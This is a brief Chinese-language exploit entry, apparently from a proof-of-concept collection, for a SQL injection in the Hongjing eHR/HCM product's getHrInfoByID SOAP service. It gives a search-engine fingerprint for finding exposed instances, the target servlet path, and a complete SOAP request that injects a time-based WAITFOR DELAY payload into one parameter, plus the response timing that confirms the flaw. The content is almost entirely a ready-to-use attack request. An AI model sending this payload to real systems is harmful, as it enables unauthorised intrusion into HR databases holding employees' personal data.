# 宏景eHRgetHrInfoByID存在SQL注入漏洞

宏景 ｜ SQL注入 ｜ —
- **指纹**：`app="HJSOFT-HCM"`
- **请求**：`POST /servlet/XFireServlet/HrpService HTTP/1.1`

**Payload**
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:hrp="http://www.hjsj.com/HrpService">
<soapenv:Header/>
<soapenv:Body>
<hrp:getHrInfoByID>
<hrp:in0>1</hrp:in0>
<hrp:in1>1'WAITFOR DELAY '0:0:5'</hrp:in1>
<hrp:in2>1</hrp:in2>
<hrp:in3>1</hrp:in3>
<hrp:in4>1</hrp:in4>
<hrp:in5>1</hrp:in5>
<hrp:in6>1</hrp:in6>
</hrp:getHrInfoByID>
</soapenv:Body>
</soapenv:Envelope>
```
- **响应特征**：200 响应时间>=5s